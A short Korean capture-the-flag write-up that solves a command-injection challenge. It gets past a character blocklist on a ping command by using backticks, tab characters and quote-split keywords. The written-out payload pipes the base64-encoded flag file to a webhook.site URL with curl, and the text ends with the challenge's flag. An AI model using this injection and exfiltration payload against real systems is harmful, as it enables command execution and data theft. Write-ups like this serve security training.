# CMDI (Adv)
CMDI 문제와 똑같지만 필터링이 몇개 더 추가된 문제이다.

이번 문제의 필터링은 ['[','$','cat','flag.py','"','*','?',' ']이다.

`cmd = f'ping -c 3 "{host}"'` 파이썬에서의 입력은 이렇게 되는데, Dquote(")가 필터링 되어 문자열 안에 항상 남아있어야 하는 문제이다.

문자열 안에서 Command를 실행할 수 있는 방법은 여러가지가 있는데, 가장 유명하고 좋은 것은 $()이다.

하지만 Dollar($)가 필터링 되어 사용할 수 없다.

그래서 찾아낸 것이 Back quote(`)이다. 문자열 안에서 Back quote 안에 Command를 작성할 경우 같이 실행된다.

단, 원래 실행될 명령어가 실패할 경우 실행되지 않는다.

```
URL Encode:
8.8.8.8`curl%09https://webhook.site/webhook-id%09-d%09\`c'a't%09fl'a'g.py|base64\``

URL Decode:
8.8.8.8`curl	https://webhook.site/webhook-id	-d	\`c'a't	fl'a'g.py|base64\`
```

위와 같이 코드를 작성하였다.
 
White Space가 필터링이기 때문에 `%09`(Tab)으로 우회하였고, curl에서 POST로 flag 값을 전달하기 위해 `cat flag.py`를 Back quote 내에서 한번 더 선언했어야 했는데 이미 Back quote 안에서 명령어를 실행 중이였기에 `\``로 우회하였다. 그리고 base64 encoding을 하여 flag 값을 전달받았다.

## Flag
flag{are_you_the_master_of_command_injection?}